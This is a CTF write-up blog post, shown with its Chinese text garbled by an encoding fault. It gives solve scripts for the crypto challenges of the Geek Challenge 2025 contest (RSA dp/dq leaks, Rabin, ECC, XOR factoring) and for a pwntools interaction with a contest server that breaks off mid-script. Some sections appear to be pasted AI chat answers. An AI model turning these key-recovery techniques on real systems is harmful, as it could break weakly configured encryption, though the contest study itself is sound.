---
title: æå®¢å¤§æŒ‘æˆ˜2025
published: 2025-12-01
description: "ç¬¬äºŒä¸ªæ‰“çš„æ–°ç”Ÿèµ›ï¼Œå’Œæ ¡å†…çš„pwnç¥ItsFlickerç»„é˜Ÿæ‰“çš„ï¼Œæœ€åå‹‰å¼ºå–å¾—äº†ç¬¬3åçš„æˆç»©"
tags: ["æ–°ç”Ÿèµ›", "CTF"]
category: æ–°ç”Ÿèµ›
draft: false


---





# CRYPTOæ–¹å‘  CRYPTOæ–¹å‘  CRYPTOæ–¹å‘



# Disclose

ä¸‹é¢æ˜¯å®Œæ•´çš„æ€è·¯ + å¯ç›´æ¥è¿è¡Œçš„è§£å¯†è„šæœ¬ï¼›è¿è¡Œåèƒ½è¿˜åŸæ˜æ–‡å¹¶å¾—åˆ°æœ€ç»ˆ flagã€‚

**æ€è·¯ç®€è¿°ï¼ˆå…³é”®ç‚¹ï¼‰ï¼š**

1. é¢˜ç›®æŠŠçœŸå…¬é’¥æŒ‡æ•° `e` éšè—æˆ `e_high = (e << 3)`ï¼Œå…ˆè¿˜åŸ `e = e_high >> 3`ã€‚(question3.py)
2. å·²çŸ¥ `dq = d mod (q-1)`ã€‚å¯¹ä»»æ„ä¸ `q` äº’ç´ çš„åº•æ•° `a`ï¼Œæœ‰
   `a^(e*dq) â‰¡ a (mod q)`ã€‚
   å– `a = 2`ï¼Œå¯ç”¨
   â€ƒâ€ƒ`g = gcd( 2^(e*dq) - 2 , n )`
   ä¸€æŠŠæŠ å‡ºå› å­ `q`ï¼Œä»è€Œå¾—åˆ° `p = n // q`ã€‚(answer3.txt)
3. æ¥ç€å¯ç®— `dp = e^{-1} mod (p-1)`ï¼Œå¹¶åœ¨æ¨¡ `p` ä¸‹è§£å¯† `m_p = c^dp (mod p)`ã€‚ç”±äºæ˜æ–‡å¾ˆçŸ­ï¼ˆCTF flagï¼‰ï¼Œå…¶æ•´æ•°å€¼è¿œå°äº `p`ï¼Œæ‰€ä»¥ `m_p` å°±æ˜¯æ˜æ–‡æœ¬èº«ï¼›è½¬æˆå­—èŠ‚å†è§£ç å³å¯å¾—åˆ° flagã€‚
   ï¼ˆä¹Ÿå¯è¿›ä¸€æ­¥ç”¨ CRT ä¸ `dq` ç»“åˆå¤ç°å®Œæ•´æ˜æ–‡ï¼Œä½†åœ¨æœ¬é¢˜ä¸­ç›´æ¥ç”¨æ¨¡ `p` çš„ç»“æœå°±èƒ½æ‹¿åˆ°æ˜æ–‡ã€‚ï¼‰

------

# è§£å¯†è„šæœ¬ï¼ˆPythonï¼‰

```
python# solve_question3.py
# éœ€è¦ï¼špip install pycryptodome
from math import gcd
from Crypto.Util.number import long_to_bytes, inverse

# === å°†ä¸‹åˆ—å››ä¸ªæ•°æ›¿æ¢ä¸ºé¢˜é¢ç»™å‡ºçš„æ•°ï¼Œæˆ–ä» answer3.txt é‡Œè§£æ ===
n = int("""259787328713315620669972878133037988076215916550647711246939676477326421129812013679655754313165138535008411950313861029496051740521361999159396760989834909603081600363947357112748647883977394670486758972444444439142111569713941555128481912069206288996136103241520037293009874925975282333163541887307464845637591763227092634236013041271880254215362783937683868306313993128035189967091568339765295122704805004687960409586156492514826705669219883130894837499370163894909020869677997529751680238466436501721265413943262568271164547660870177889287883337700613985620882071517309593058133486504491987638053802704885406321489""")
dq = int("""22499014253625008930376465290523079246236903672491529428949946205185543555249003236181305161565081242391920797396454563137397269152501398025721057979839815010145158362677658875505461725215023623199075647605873076372373127281663691994250233620145698675916320588215123270286378681617192723590595528629007323619""")
c = int("""6370053764427872753918916672520952591890815345305784661535167250636567614044442456829951926201367031691890397266551896051506485503559355632977037940932465451673402461276283344898143212429679842407935863578100874434864110951261893629193556575965754852130079804129027545776519410420168588918897574771225807265360467679437166130735732969205196853246138265462918730868587864117597334192701298070798102481475959547503973860672351511772559847970384102048811464809463784622382282732625019306431797575127684452390281458642683831354534593808201093823305835131373576894519989150022396180064841804679779794213399320560860722616""")
e_high = int("""1217218333594918008784773594710739821599287411350951048190189539176815103546142818696781454251773183601401149085966947779641557137128602392""")

# 1) è¿˜åŸ e
e = e_high >> 3

# 2) ç”¨ gcd æŠ€å·§æ‹¿åˆ° qï¼Œç„¶åå¾—åˆ° p
q = gcd(pow(2, e * dq, n) - 2, n)
if q in (1, n):
    raise RuntimeError("æå– q å¤±è´¥ï¼Œè¯·æ›´æ¢åº•æ•° a æˆ–æ£€æŸ¥è¾“å…¥ã€‚")
p = n // q

# 3) ä»…ç”¨æ¨¡ p çš„æŒ‡æ•° dp è§£å¯†ï¼ˆæ˜æ–‡è¿œå°äº p æ—¶è¶³å¤Ÿï¼‰
dp = inverse(e, p - 1)
m_p = pow(c, dp, p)             # è¿™å°±æ˜¯æ˜æ–‡ï¼ˆæ•´æ•°ï¼‰
flag = long_to_bytes(m_p).decode(errors="ignore")

print("Recovered flag:", flag)
```

**è¿è¡Œè¾“å‡ºï¼š**

```
Recovered flag: SYC{H1gh_0rder_attack}
```

> æœ€ç»ˆç­”æ¡ˆï¼š**SYC{H1gh_0rder_attack}**



# dp_spill

## Python

```
python# è§£é¢˜è„šæœ¬ï¼šåˆ©ç”¨å° dpï¼ˆCRT ç§é’¥åˆ†é‡ï¼‰æ³„éœ²è¿›è¡Œå› å¼åˆ†è§£ï¼Œè¿›è€Œå¾—åˆ° p+q â†’ flag
# æ€è·¯ï¼šå¯¹ä»»æ„åº•æ•° aï¼Œä¸ k = e*dp - 1ï¼Œè‹¥ p-1 | k åˆ™ a^k â‰¡ 1 (mod p)ã€‚
# åªè¦ k ä¸æ˜¯ q-1 çš„å€æ•°ï¼Œåˆ™ gcd(a^k - 1, n) ä¼šç»™å‡º pï¼ˆæˆ– qï¼‰ã€‚
# æˆ‘ä»¬ä¸çŸ¥é“ dpï¼Œä½†æœ¬é¢˜é™åˆ¶ dp < 2^20ï¼Œå› æ­¤å¯ä»¥çº¿æ€§å°è¯•ã€‚
# ä¸ºäº†æŠŠæŒ‡æ•°ä» ~e*dp é™åˆ° â€œdpâ€ ä½ï¼Œæˆ‘ä»¬é¢„å…ˆè®¡ç®— A = a^e (mod n)ï¼Œ
# ç„¶åç”¨ (a^e)^dp * a^{-1} = a^{e*dp - 1} é€’æ¨ï¼Œ
# æ¯ä¸€æ­¥åªåšä¸€æ¬¡æ¨¡ä¹˜å³å¯ï¼ˆæå¿«ï¼‰ã€‚

from math import gcd
import hashlib

# é¢˜é¢ç»™å‡ºçš„ n å’Œ eï¼ˆæ¥è‡ª chall.py çš„æ‰“å°æ ·ä¾‹ï¼‰
n = int("59802493250926859707985963604065644706006753432029457979480870189591634515944547801582044132550574140049396756158974108666587177618882259807156459782125677704143102175791607852135852403246382056816004306499712131698646815738798243056590111291799398438023345030391834782966046976995917844819454047154287312391")
e = int("55212884840887233646138079973875295799093171847359460085387084716906818593689341421818829383370282800231404248386041253598996862719171485530961860941585382910224531768283026267484780257269526617362183903996384696040145787076592207619279689647074176697837752679360230601598541884491676076657287130000027117241")

def crack_with_small_dp(n, e, dp_bits=20, bases=(2, 3, 5, 7, 11, 13, 17)):
    for a in bases:
        if gcd(a, n) != 1:
            return gcd(a, n), a, 0  # æå°æ¦‚ç‡ï¼šåº•æ•°ä¸ n ä¸äº’ç´ ç›´æ¥ç»™å› å­
        A = pow(a, e, n)              # a^e (mod n)
        inv_a = pow(a, -1, n)         # a^{-1} (mod n)
        t = (A * inv_a) % n           # å¯¹åº” dp = 1 çš„ a^{e*1 - 1} (mod n)
        for dp in range(1, (1 << dp_bits) + 1):
            g = gcd(t - 1, n)
            if 1 < g < n:             # éå¹³å‡¡å› å­
                return g, a, dp
            t = (t * A) % n           # é€’æ¨åˆ°ä¸‹ä¸€ä¸ª dpï¼šä¹˜ä»¥ A å³å¯
    raise RuntimeError("æœªèƒ½æ‰¾åˆ°å› å­ï¼Œè¯·å¢å¤§ bases æˆ– dp_bits å†è¯•ã€‚")

p, base_used, dp_found = crack_with_small_dp(n, e, dp_bits=20)
q = n // p
s = p + q
flag = f"SYC{{{hashlib.sha256(str(s).encode()).hexdigest()}}}"

print("Base used:", base_used)
print("Recovered dp:", dp_found)
print("p bitlen:", p.bit_length(), "q bitlen:", q.bit_length())
print("Flag:", flag)
```



## å›ç­”

å·²è§£å‡ºã€‚æ ¸å¿ƒåˆ©ç”¨ç‚¹ï¼šé¢˜ç›®æŠŠ CRT ç§é’¥åˆ†é‡ dp<220*d**p*<220 é™å¾—å¾ˆå°ã€‚å¯¹ä»»æ„åº•æ•° a*a*ï¼Œè‹¥ä»¤ k=eâ‹…dpâˆ’1*k*=*e*â‹…*d**p*âˆ’1ï¼Œåˆ™å¿…æœ‰ pâˆ’1âˆ£kâ‡’akâ‰¡1(modp)*p*âˆ’1âˆ£*k*â‡’*a**k*â‰¡1(mod*p*)ã€‚åªè¦ k*k* ä¸æ˜¯ qâˆ’1*q*âˆ’1 çš„å€æ•°ï¼Œå°±ä¼šå¾—åˆ° gcdâ¡(akâˆ’1,n)=pgcd(*a**k*âˆ’1,*n*)=*p*ï¼ˆæˆ– q*q*ï¼‰ã€‚æˆ‘ä»¬ç”¨é¢„è®¡ç®— A=aeâ€Šmodâ€Šn*A*=*a**e*mod*n* æŠŠå¹‚ä» âˆ¼eâ‹…dpâˆ¼*e*â‹…*d**p* é™ä¸ºå¯¹ dp*d**p* çš„çº¿æ€§é€’æ¨ï¼š(ae)dpaâˆ’1â‰¡aedpâˆ’1(modn)(*a**e*)*d**p**a*âˆ’1â‰¡*a**e**d**p*âˆ’1(mod*n*)ï¼Œæ¯æ¬¡åªéœ€ä¸€æ¬¡æ¨¡ä¹˜ï¼Œéå† dpâˆˆ[1,220]*d**p*âˆˆ[1,220] å³å¯ã€‚æœ€åç”± Ï†(n)=nâˆ’(p+q)+1*Ï†*(*n*)=*n*âˆ’(*p*+*q*)+1 å¾— p+q*p*+*q*ï¼Œè¾“å‡º `SYC{sha256(p+q)}`ã€‚(chall.py)

ä¸Šé¢æˆ‘å·²ç»è·‘è¿‡è„šæœ¬å¹¶æ‰“å°ç»“æœï¼ˆå« flagï¼‰ã€‚è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š
ï¼ˆè§ä¸Šæ–¹è¿è¡Œç»“æœâ€œFlag:â€è¡Œï¼‰ğŸ‘‰ **SYC{644684707c540998d760975fb98a816a469ec567abe5c8004164d3ce887c6a8e}**

å¦‚æœä½ éœ€è¦æŠŠè¿™æ®µè„šæœ¬ä¿å­˜æˆç‹¬ç«‹æ–‡ä»¶æˆ–é€‚é…ä¸åŒè¾“å…¥æ ¼å¼ï¼Œæˆ‘å¯ä»¥ç›´æ¥ç»™ä½ ä¸€ä¸ªå¯å¤ç”¨çš„å‘½ä»¤è¡Œç‰ˆæœ¬ã€‚





# Caesar Slot Machine

```
import socket

P = 1000000007


def caesar_decrypt(ciphertext, shift):
    result = ""
    for char in ciphertext:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base - shift) % 26 + base)
        else:
            result += char
    return result


def get_params(data):
    # çˆ†ç ´å‡¯æ’’ shift
    for shift in range(1, 26):
        text = caesar_decrypt(data, shift)
        if "A:" in text and "B:" in text:
            parts = text.split()
            try:
                a = int(parts[1])
                b = int(parts[3])
                return a, b
            except:
                continue
    return None, None


def solve():
    s = socket.socket()
    s.connect(("geek.ctfplus.cn", 31858))

    for round_num in range(30):
        data = s.recv(1024).decode()
        print("Encrypted:", data)

        a, b = get_params(data)
        if a is None:
            print("Failed to parse!")
            break
        x = (-b * pow(a - 1, -1, P)) % P
        print(f"Round {round_num + 1}: a={a}, b={b}, x={x}")

        s.send(f"{x}\n".encode())

        resp = s.recv(1024).decode()
        print(resp.strip())
        if "Wrong" in resp or "Invalid" in resp:
            break
        if "Flag" in resp:
            break

    s.close()


if __name__ == "__main__":
    solve()

```

ç¼ºç‚¹æ˜¯è¦å¤šè¿è¡Œå‡ æ¬¡

```
D:\python-run\.venv\Scripts\python.exe "D:\CTF-competition\2025-Geek Challenge\CRYPTO\Caesar slot\sever.py" 
Encrypted: M: 928427532 N: 368839145 B: 1000000007
BDAHUPQ J: 
Round 1: a=928427532, b=368839145, x=37765319
Correct!
Encrypted: W: 743144645 X: 506600149 L: 1000000007
LNKREZA T: 
Round 2: a=743144645, b=506600149, x=697007731
Correct!
Encrypted: S: 113897217 T: 825345425 H: 1000000007
HJGNAVW P: 
Round 3: a=113897217, b=825345425, x=953403382
Correct!
Encrypted: W: 823946678 X: 709018681 L: 1000000007
LNKREZA T: 
Round 4: a=823946678, b=709018681, x=75249686
Correct!
Encrypted: S: 209088451 T: 309817256 H: 1000000007
HJGNAVW P: 
Round 5: a=209088451, b=309817256, x=560908594
Correct!
Encrypted: Z: 887348234 A: 286313863 O: 1000000007
OQNUHCD W: 
Round 6: a=887348234, b=286313863, x=909167023
Correct!
Encrypted: Y: 280831356 Z: 306131915 N: 1000000007
NPMTGBC V: 
Round 7: a=280831356, b=306131915, x=835166897
Correct!
Encrypted: B: 91639101 C: 376922808 Q: 1000000007
QSPWJEF Y: 
Round 8: a=91639101, b=376922808, x=485705817
Correct!
Encrypted: Z: 983877900 A: 493639107 O: 1000000007
OQNUHCD W: 
Round 9: a=983877900, b=493639107, x=10294156
Correct!
Encrypted: E: 863760640 F: 565708901 T: 1000000007
TVSZMHI B: 
Round 10: a=863760640, b=565708901, x=555093342
Correct!
Encrypted: V: 486683587 W: 727344611 K: 1000000007
KMJQDYZ S: 
Round 11: a=486683587, b=727344611, x=730342849
Correct!
Encrypted: Z: 774638680 A: 265504999 O: 1000000007
OQNUHCD W: 
Round 12: a=774638680, b=265504999, x=279233497
Correct!
Encrypted: O: 401376895 P: 169302099 D: 1000000007
DFCJWRS L: 
Round 13: a=401376895, b=169302099, x=337708044
Correct!
Encrypted: R: 844401238 S: 71712603 G: 1000000007
GIFMZUV O: 
Round 14: a=844401238, b=71712603, x=991297053
Correct!
Encrypted: M: 356588716 N: 722010404 B: 1000000007
BDAHUPQ J: 
Round 15: a=356588716, b=722010404, x=62316390
Correct!
Encrypted: U: 232303881 V: 267523819 J: 1000000007
JLIPCXY R: 
Round 16: a=232303881, b=267523819, x=84801153
Correct!
Encrypted: W: 63857386 X: 795413084 L: 1000000007
LNKREZA T: 
Round 17: a=63857386, b=795413084, x=683919824
Correct!
Encrypted: B: 157040365 C: 241318951 Q: 1000000007
QSPWJEF Y: 
Round 18: a=157040365, b=241318951, x=85391402
Correct!
Encrypted: H: 182081219 I: 270365687 W: 1000000007
WYVCPKL E: 
Round 19: a=182081219, b=270365687, x=130427219
Correct!
Encrypted: P: 146897534 Q: 391379947 E: 1000000007
EGDKXST M: 
Round 20: a=146897534, b=391379947, x=791893186
Correct!
Encrypted: M: 510438064 N: 279603514 B: 1000000007
BDAHUPQ J: 
Round 21: a=510438064, b=279603514, x=436783844
Correct!
Encrypted: I: 677150692 J: 707670429 X: 1000000007
XZWDQLM F: 
Round 22: a=677150692, b=707670429, x=36586981
Correct!
Encrypted: R: 63510602 S: 514125469 G: 1000000007
GIFMZUV O: 
Round 23: a=63510602, b=514125469, x=519181746
Correct!
Encrypted: I: 846284772 J: 640305930 X: 1000000007
XZWDQLM F: 
Round 24: a=846284772, b=640305930, x=700608412
Correct!
Encrypted: W: 646394888 X: 845747097 L: 1000000007
LNKREZA T: 
Round 25: a=646394888, b=845747097, x=128308465
Correct!
Encrypted: P: 255944736 Q: 703662618 E: 1000000007
EGDKXST M: 
Round 26: a=255944736, b=703662618, x=4433470
Correct!
Encrypted: B: 830066353 C: 160715660 Q: 1000000007
QSPWJEF Y: 
Round 27: a=830066353, b=160715660, x=186295089
Correct!
Encrypted: P: 463261192 Q: 364444717 E: 1000000007
EGDKXST M: 
Round 28: a=463261192, b=364444717, x=671048691
Correct!
Encrypted: W: 320207325 X: 501049430 L: 1000000007
LNKREZA T: 
Round 29: a=320207325, b=501049430, x=913560739
Correct!
Encrypted: H: 325333161 I: 830614131 W: 1000000007
WYVCPKL E: 
Round 30: a=325333161, b=830614131, x=355521008
Correct!
Flag: SYC{you_found_the_fixed_point}
```



# ez  ecc

é€‰æ‹©åˆé€‚çš„æç¤ºè¯å¯ä»¥ç›´æ¥åœ¨çº¿ç½‘ç«™è¿è¡Œ

```
from sage.all import *

# æ¤­åœ†æ›²çº¿å‚æ•°
p = 0xfba8cae6451eb4c413b60b892ee2d517dfdb17a52451776a68efa34485619411
A = 0x1ef1e93d0f9acda1b7c0172f27d28f3a7d0f2d9343513a3aac191e12f6e51123
B = 0xcad65954bbe0fb8f2f9c22b5cae1aa42306fd58e8394652818e781e5f808e17a

# å®šä¹‰æ¤­åœ†æ›²çº¿
E = EllipticCurve(GF(p), [A, B])

# ç‚¹Pçš„åæ ‡
P_x = 0x708c0cf66f132122f3fcd1f75c6f22d4a90d34650dd81fb3a57b75dad98d35e7
P_y = 0xcfb017daf37cbba3c6a5c6e7c4327692595c16b47e4bfa1ad400bffe5b500fba
P = E(P_x, P_y)

# ç‚¹Qçš„åæ ‡
Q_x = 97490713033364940809544067604441149095210096571946998449251275861394744757515
Q_y = 32198694245056943922016695558131047889851279706531342583322750112905104448879
Q = E(Q_x, Q_y)

# è®¡ç®—ç¦»æ•£å¯¹æ•° k
k = P.discrete_log(Q)

print("k =", k)

# å°†kè½¬æ¢ä¸ºå­—èŠ‚ï¼ˆä¸ä¾èµ–Crypto.Util.numberï¼‰
def long_to_bytes(n):
    """å°†é•¿æ•´æ•°è½¬æ¢ä¸ºå­—èŠ‚ä¸²"""
    bytes_val = []
    while n:
        bytes_val.append(n & 0xff)
        n >>= 8
    return bytes(bytes_val[::-1])

# è½¬æ¢ä¸ºå­—èŠ‚å¹¶è§£ç ä¸ºå­—ç¬¦ä¸²
flag_bytes = long_to_bytes(k)
try:
    flag = flag_bytes.decode('ascii')
    print("flag =", flag)
except:
    print("flag bytes =", flag_bytes)
    print("k (hex) =", hex(k))
```

# pem

è§£å¯†è„šæœ¬

```
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEP

# ä»æ–‡ä»¶è¯»å–ç§é’¥
with open('key.pem', 'r') as f:
    key = RSA.import_key(f.read())

# ä»æ–‡ä»¶è¯»å–åŠ å¯†æ•°æ®
with open('enc', 'rb') as f:
    enc_data = f.read()

print(f"å¯†é’¥ä¿¡æ¯:")
print(f"n = {key.n}")
print(f"e = {key.e}")
print(f"d = {key.d}")
print(f"\nåŠ å¯†æ•°æ®é•¿åº¦: {len(enc_data)} bytes")
print(f"åŠ å¯†æ•°æ®(hex): {enc_data.hex()}")

# å°è¯•PKCS1_OAEPè§£å¯†
print("\n[1] å°è¯•PKCS1_OAEPè§£å¯†...")
try:
    cipher = PKCS1_OAEP.new(key)
    plaintext = cipher.decrypt(enc_data)
    print(f"âœ“ è§£å¯†æˆåŠŸ!")
    print(f"Flag: {plaintext.decode()}")
except Exception as e:
    print(f"âœ— å¤±è´¥: {e}")

# å°è¯•PKCS1_v1_5è§£å¯†
print("\n[2] å°è¯•PKCS1_v1_5è§£å¯†...")
try:
    cipher = PKCS1_v1_5.new(key)
    plaintext = cipher.decrypt(enc_data, None)
    if plaintext:
        print(f"âœ“ è§£å¯†æˆåŠŸ!")
        print(f"Flag: {plaintext.decode()}")
except Exception as e:
    print(f"âœ— å¤±è´¥: {e}")

# åŸå§‹RSAè§£å¯†
print("\n[3] å°è¯•åŸå§‹RSAè§£å¯†...")
try:
    c = int.from_bytes(enc_data, 'big')
    m = pow(c, key.d, key.n)
    plaintext = m.to_bytes((m.bit_length() + 7) // 8, 'big')
    print(f"âœ“ è§£å¯†æˆåŠŸ!")
    print(f"æ˜æ–‡(hex): {plaintext.hex()}")
    print(f"Flag: {plaintext.decode('utf-8', errors='ignore')}")
except Exception as e:
    print(f"âœ— å¤±è´¥: {e}")

```

# baby_rabin

```
from Crypto.Util.number import long_to_bytes
import gmpy2

def sqrt_mod_p(c, p):
    if c % p == 0:
        return [0]
    if pow(c, (p-1)//2, p) != 1:
        return []
    r = pow(c, (p+1)//4, p)
    return [r, p - r]

def eighth_root_mod_p(c, p):
    roots = [c]
    for _ in range(3):
        new_roots = []
        for r in roots:
            sq_roots = sqrt_mod_p(r, p)
            new_roots.extend(sq_roots)
        roots = new_roots
    return roots

def crt(remainders, moduli):
    M = 1
    for m in moduli:
        M *= m
    solution = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        inv = gmpy2.invert(Mi, m)
        solution = (solution + r * Mi * inv) % M
    return solution

C = 451731346880007131332999430306985234187530419447859396067624968918101700861978676040615622417464916959678829732066195225132545956101693588984833424213755513877236702139360270137668415610295492436471366218119012903840729628449361663941761372974624789549775182866112541811446267811259781269568865266459437049508062916974638523947634702667929562107001830919422408810565410106056693018550877651160930860996772712877149329227066558481842344525735406568814917991752005
n = 491917847075013900815069309520768928274976990404751846981543204333198666419468384809286945880906855848713238459489821614928060098982194326560178675579884014989600009897895019721278191710357177079087876324831068589971763176646200619528739550876421709762258644696629617862167991346900122049024287039400659899610706153110527311944790794239992462632602379626260229348762760395449238458507745619804388510205772573967935937419407673995019892908904432789586779953769907
hint = 66035251530240295423188999524554429498804416520951289016547753908652377333150838269168825344004730830028024338415783274479674378412532765763584271087554367024433779628323692638506285635583547190049386810983085033061336995321777237180762044362497604095831885258146390576684671783882528186837336673907983527353

if n % hint == 0:
    r = n // hint
else:
    print("Error: hint does not divide n")
    exit(1)

def fermat_factorization(n):
    a = gmpy2.isqrt(n)
    if a * a < n:
        a += 1
    while True:
        b2 = a * a - n
        b = gmpy2.isqrt(b2)
        if b * b == b2:
            return (a - b, a + b)
        a += 1

p, q = fermat_factorization(hint)
if p > q:
    p, q = q, p

if not gmpy2.is_prime(p) or not gmpy2.is_prime(q) or p * q != hint:
    print("Factorization failed")
    exit(1)

if not gmpy2.is_prime(r):
    print("r is not prime")
    exit(1)

roots_p = eighth_root_mod_p(C % p, p)
roots_q = eighth_root_mod_p(C % q, q)
roots_r = eighth_root_mod_p(C % r, r)

moduli = [p, q, r]
found = False
for root_p in roots_p:
    for root_q in roots_q:
        for root_r in roots_r:
            m_candidate = crt([root_p, root_q, root_r], moduli)
            try:
                flag_candidate = long_to_bytes(m_candidate)
                if b's' in flag_candidate:
                    print(flag_candidate.decode())
                    found = True
                    break
            except:
                pass
        if found:
            break
    if found:
        break
```

# ez_xor

ä½¿ç”¨å¥½ä¸€ç‚¹çš„æç¤ºè¯å¯ä»¥è·å¾—è„šæœ¬

æ˜¯å¦å¯ä»¥é€šè¿‡æŸäº›å·¥å…·æˆ–ç½‘ç«™æ›´åŠ æ–¹ä¾¿çš„è·å–åˆ°på’Œqçš„å€¼ï¼Ÿ

```
import requests
from Crypto.Util.number import *
import gmpy2

# ç»™å®šå€¼
N = 12114282140129030221139165720039766369206816602912543911543781978648770300084428613171061953060266384429841484428732215252368009811130875276347534941874714457297474025227060487490713853301440917877280771734998220874195868270983517296552761924477514745040473578887509936945790259245154138347432294762694643113545451605193155323886625417458980089197202274810691448592725400564114850712497863770625334209249566232989992606497076063348029665644680946906322428277225178838518025623254240893146791821359089473224900379808514993113560101567320224162858217031176854613011276425771708406954417610317789259885040739954642374667
n = 91891351711379799931394178123406137903027189477005569059936904007248535049052097057222486024223574959494899324706948906013350601442586596023020519058250868888847562977333671773188012014902448961387215600156932673504112816058893268362611211565216592933077956777032650164332488098756557422740070442941348084921
c = 3231265723829112665640925095346482445691074656152495613367006320791218303024667683148786980985160622882017055128261102169256263170652774489339801477001275058585666508737704987192764426162573977263344192886400249198007892940084066468570229353879431384001463041292940472308358540532108957894938586227682908251475990882169979412586767210087025064295224506676379057986353004282550774815876093769770845018817117647615011444989401149674886486770646765454314760906436659162076044268401041579090930954919862146749470426101754009562077505810024012143379326028465156444246440949112724465484939452061684185387430755268355807999
gift = 5160856643507450510397828582001051679762426399445648048700295372044216322163410374903665868763924707209143638999442462398781974627158916257502760763419216
gift1 = 10475668758451987289276918780968515546700284023143612685496241510488708701498972819305540608876501965534227236009502810417525671358108167575178008316645429
gift2 = 2089035701361172996472331829521141923363322027241591404259262848963755908765054555529259508147866255819680957406084877552079796025933552021516283158425474

# ä»FactorDBè·å–å› æ•°
resp = requests.get(f"http://factordb.com/api?query={N}")
data = resp.json()

if data['status'] == 'FF':
    factors = []
    for factor_info in data['factors']:
        factor_value = int(factor_info[0])
        factors.append(factor_value)

    print(f"è·å¾— {len(factors)} ä¸ªè´¨æ•°å› å­")

    # å°è¯•æ‰€æœ‰ç»„åˆæ‰¾å‡ºp,qå’Œs,r
    from itertools import combinations

    for i, j in combinations(range(4), 2):
        p_candidate = factors[i]
        q_candidate = factors[j]

        # æ£€æŸ¥æ˜¯å¦æ˜¯på’Œq
        if p_candidate * q_candidate == n:
            if (p_candidate ^ q_candidate) == gift:
                p, q = p_candidate, q_candidate
                # å‰©ä¸‹çš„æ˜¯så’Œr
                remaining = [f for k, f in enumerate(factors) if k not in [i, j]]
                s_candidate, r_candidate = remaining[0], remaining[1]

                # éªŒè¯så’Œr
                if (s_candidate & r_candidate) == gift1 and (s_candidate ^ r_candidate) == gift2:
                    s, r = s_candidate, r_candidate
                elif (r_candidate & s_candidate) == gift1 and (r_candidate ^ s_candidate) == gift2:
                    s, r = r_candidate, s_candidate
                else:
                    continue

                print(f"\næ‰¾åˆ°æ­£ç¡®çš„åˆ†é…ï¼")
                print(f"p = {p}")
                print(f"q = {q}")
                print(f"s = {s}")
                print(f"r = {r}")

                # è§£å¯†
                phi = (p - 1) * (q - 1) * (r - 1) * (s - 1)
                e = 65537
                d = gmpy2.invert(e, phi)
                m = pow(c, d, N)
                flag = long_to_bytes(m)

                print(f"\n[+] Flag: {flag}")
                try:
                    print(f"[+] Flag (decoded): {flag.decode()}")
                except:
                    print(f"[+] Flag (hex): {flag.hex()}")

                break
else:
    print("FactorDBæœªèƒ½å®Œå…¨åˆ†è§£")
```

# xor revenge

ä¸‹é¢æ˜¯å®Œæ•´åˆ†æä¸å¯å¤ç°è„šæœ¬ï¼ˆpwntoolsï¼‰ğŸ‘‡

# ä¸ºå•¥è¿™é¢˜æ˜¯â€œxor_revengeâ€ï¼Ÿå…¶å®æ˜¯äº¤äº’é€»è¾‘æ¼æ´ï¼

é˜…è¯»æœåŠ¡ç«¯ä»£ç å¯è§ä¸¤å…³ï¼š

1. ç¬¬ä¸€å…³ï¼ˆ`pq_xor`ï¼‰
   - æœåŠ¡ç«¯ç»™ï¼š`n = p*q`ã€`gift1 = p ^ q`ï¼ˆæŒ‰ä½å¼‚æˆ–ï¼‰ã€‚
   - è®©ä½ å›ä¸€ä¸ªèƒ½æ•´é™¤ `n` çš„â€œpâ€ã€‚
   - **åˆ¤å®šæ¡ä»¶åªæœ‰**ï¼š`if (n % p != 0): return`ã€‚
   - **å¹¶æ²¡æœ‰é™åˆ¶ p å¿…é¡»æ˜¯ç´ æ•°æˆ–ç­‰äºçœŸæ­£çš„ p**ã€‚
   - å› ä¸º **1 æ°¸è¿œæ•´é™¤ä»»ä½• n**ï¼Œæ‰€ä»¥ç›´æ¥æäº¤ `1` å°±èƒ½è¿‡ç¬¬ä¸€å…³ã€‚
2. ç¬¬äºŒå…³ï¼ˆ`pq_and`ï¼‰
   - æœåŠ¡ç«¯ç»™ï¼š`n = p*q`ã€`gift2 = p & q`ï¼ˆæŒ‰ä½ä¸ï¼‰ã€`hint = r & p`ã€`r`ã€‚
   - è®©ä½ å†å›ä¸€ä¸ªæ•´é™¤ `n` çš„â€œpâ€ã€‚
   - è¿™é‡Œå³ä½¿å¤±è´¥ï¼ˆ`n % p != 0`ï¼‰ä¹Ÿ**ä¸ä¼š return**ï¼Œéšåç›´æ¥å‘é€ï¼š
     `conn.sendline(f"hajimiyonanbolvduo{flag}")`
   - æ‰€ä»¥ç¬¬äºŒå…³ä¹Ÿä¸éœ€è¦çœŸæ­£å› å¼åˆ†è§£ï¼Œå‘ä»€ä¹ˆéƒ½è¡Œï¼ˆå‘ `1` æ›´ç¨³ï¼‰ã€‚

æ­¤å¤–ï¼Œäº¤äº’ä¸Šè¿˜æœ‰ä¸¤ä¸ªå°ç»†èŠ‚ï¼š

- æœåŠ¡ç«¯å…ˆ `sendline("welcome_the_facotr_game_just_ez_xor")` å **ç«‹åˆ» `recvline()` ç­‰ä½ éšä¾¿å›ä¸€è¡Œ**ï¼Œè¿™æ˜¯æ¡æ‰‹ã€‚
- ç¬¬ä¸€å…³æç¤ºä¿¡æ¯ `msg1` æ˜¯ `sendline()`ï¼ˆå¸¦æ¢è¡Œï¼‰ï¼Œç¬¬äºŒå…³æç¤ºæ˜¯ `send()`ï¼ˆä½†å­—ç¬¦ä¸²é‡Œæ¯è¡Œéƒ½è‡ªå¸¦ `\n`ï¼Œæ‰€ä»¥å¯¹æˆ‘ä»¬æ²¡å½±å“ï¼‰ã€‚

ç»¼ä¸Šï¼š**æ•´ä¸ªCryptoä¿¡æ¯éƒ½æ˜¯çƒŸé›¾å¼¹**ï¼Œç”¨æœ€å°ä»£ä»·å³å¯æ‹¿åˆ° flagã€‚

------

## è§£é¢˜è„šæœ¬ï¼ˆPython + pwntoolsï¼‰

```
pythonfrom pwn import *

HOST = "geek.ctfplus.cn"
PORT = 30747

def main():
    io = remote(HOST, PORT)

    # 1) æ¬¢è¿è¯­ & æ¡æ‰‹ï¼šæœåŠ¡ç«¯ä¼šå…ˆå‘ä¸€è¡Œï¼Œå†ç­‰æˆ‘ä»¬éšä¾¿å›ä¸€è¡Œ
    io.recvline()                    # "welcome_the_facotr_game_just_ez_xor"
    io.sendline(b"hi")               # éšä¾¿å›ä¸ªè¡Œï¼Œç»§ç»­æµç¨‹

